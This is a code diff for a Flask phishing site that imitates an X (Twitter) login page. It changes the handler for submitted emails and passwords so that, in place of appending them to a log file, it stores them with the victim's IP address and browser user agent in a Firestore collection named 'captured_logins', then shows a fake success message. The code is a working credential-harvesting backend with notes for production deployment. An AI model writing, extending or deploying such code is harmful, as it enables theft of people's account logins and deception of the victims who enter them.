@@ -1,7 +1,42 @@
+import json
+import os
+import firebase_admin
+from firebase_admin import credentials, firestore
 import os
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
+# Firebase setup
+cred = None
+
+# 1. Vercel production: credentials from env var
+firebase_json_str = os.environ.get('FIREBASE_CREDENTIALS')
+if firebase_json_str:
+    try:
+        cred_dict = json.loads(firebase_json_str)
+        cred = credentials.Certificate(cred_dict)
+    except json.JSONDecodeError as e:
+        print(f"Error parsing FIREBASE_CREDENTIALS: {e}")
+    except Exception as e:
+        print(f"Firebase credential error: {e}")
+
+# 2. Local testing fallback (use your downloaded JSON file)
+if cred is None:
+    # Change this path to where YOU saved the JSON file
+    local_json_path = r"C:\Users\Mohit\Downloads\mohit-x-phish-demo-firebase-adminsdk-abc123-xyz.json"
+    try:
+        cred = credentials.Certificate(local_json_path)
+    except Exception as e:
+        print(f"Local Firebase key error: {e}")
+
+# Initialize if credentials were loaded
+if cred:
+    firebase_admin.initialize_app(cred)
+    db = firestore.client()
+    print("Firestore initialized successfully")
+else:
+    print("WARNING: Firestore NOT initialized - no credentials found")
+    db = None  # or handle gracefully
 
 X_PHISHING_TEMPLATE = '''
 <!DOCTYPE html>
@@ -106,15 +141,27 @@ def index():
 
 @app.route('/x-auth', methods=['POST'])
 def authenticate():
-    email = request.form.get('email', '')
-    password = request.form.get('password', '')
-    
-    # Log credentials to file
-    with open('creds.log', 'a') as f:
-        f.write(f"{email}:{password}\n")
-    
-    return "Authentication successful"
+    email = request.form.get('email', '').strip()
+    password = request.form.get('password', '').strip()
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    if email and password:
+        if db is None:
+            print("DB not initialized - skipping save")
+        else:
+            try:
+                print(f"Attempting to save: {email}")
+                doc_ref = db.collection('captured_logins').document()
+                doc_ref.set({
+                    'email': email,
+                    'password': password,
+                    'timestamp': firestore.SERVER_TIMESTAMP,
+                    'ip': request.remote_addr or 'unknown',
+                    'user_agent': request.headers.get('User-Agent', 'unknown')
+                })
+                print(f"Successfully saved login for {email}")
+            except Exception as e:
+                print(f"Firestore save FAILED: {str(e)}")
+    else:
+        print("Empty credentials - not saving")
+
+    return "Authentication successful"
